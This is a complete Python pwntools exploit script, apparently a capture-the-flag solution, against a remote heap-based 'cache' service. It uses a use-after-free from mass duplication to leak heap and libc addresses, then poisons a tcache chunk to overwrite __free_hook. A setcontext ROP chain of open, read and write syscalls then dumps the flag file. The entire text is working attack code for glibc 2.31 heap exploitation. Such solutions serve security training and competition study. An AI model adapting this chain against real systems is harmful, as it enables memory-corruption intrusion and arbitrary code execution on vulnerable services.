from pwn import *

#r = process("./cache", env={"LD_PRELOAD":"libc-2.31.so"})
r = remote("192.46.228.70", 27025)
b = ELF("./cache", checksec=False)
l = ELF("./libc-2.31.so", checksec=False)

def create(name, size):
    r.sendlineafter("> ", "1")
    r.sendlineafter("name: ", name)
    r.sendlineafter("Size: ", str(size))

def read(name, off, n):
    r.sendlineafter("> ", "2")
    r.sendlineafter("name: ", name)
    r.sendlineafter("Offset: ", str(off))
    r.sendlineafter("Count: ", str(n))

def write(name, off, n, data):
    r.sendlineafter("> ", "3")
    r.sendlineafter("name: ", name)
    r.sendlineafter("Offset: ", str(off))
    r.sendlineafter("Count: ", str(n))
    r.sendafter("Data: ", data)

def erase(name):
    r.sendlineafter("> ", "4")
    r.sendlineafter("name: ", name)

def duplicate(name, new_name):
    r.sendlineafter("> ", "5")
    r.sendlineafter("Source cache name: ", name)
    r.sendlineafter("New cache name: ", new_name)

# Create a victim caches
create("victim1", 0x100)
write("victim1", 0, 8, "A"*8)
create("victim2", 0x100)
write("victim2", 0, 8, "B"*8)

# Create a large cache to duplicate over and over
create("orig", 0x18000)
write("orig", 0, 8, "A"*8)

# Duplicate orig 256 times
for i in range(256):
    #print(i)
    duplicate("orig", "dup_{}".format(i))

# Erase dup_0, orig's unique_ptr will now point at tcache_perthread_struct (top of heap)
erase("dup_0")

# Leak heap
read("orig", 0x11ea8, 8)
heap = u64(r.recv(8)) - 0x11ed0
log.info("heap: {}".format(hex(heap)))

# Leak libc
read("orig", 0x12238, 8)
l.address = u64(r.recv(8)) - 0x1ebbe0
log.info("libc: {}".format(hex(l.address)))
call_gadget = l.address + 0x154930
setcontext_gadget = l.address + 0x580DD
pop_rdi = l.address + 0x26b72
pop_rsi = l.address + 0x27529
pop_rdx_r12 = l.address + 0x11c371
push_rax = l.address + 0x45197
pop_rax = l.address + 0x4a550
xchg_eax_edi = l.address + 0x2ad2b
syscall_ret = l.address + 0x66229

# Erase victims, overwrite victim2's fd to __free_hook
erase("victim1")
erase("victim2")
write("orig", 0x120b0, 8, p64(l.symbols["__free_hook"]))

# Build ROP payload
base = heap + 0x2d190             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x258)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0x1b0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/home/cache/flag", O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
payload += b"/home/cache/flag"

# Create a cache with payload as its name
create(payload, 0x100)
write(payload, 0, 8, "A"*8)

# Overwrite __free_hook with call_gadget
create("free", 0x100)
write("free", 0, 8, p64(call_gadget))

# Execute the chain
erase(payload)

r.interactive()
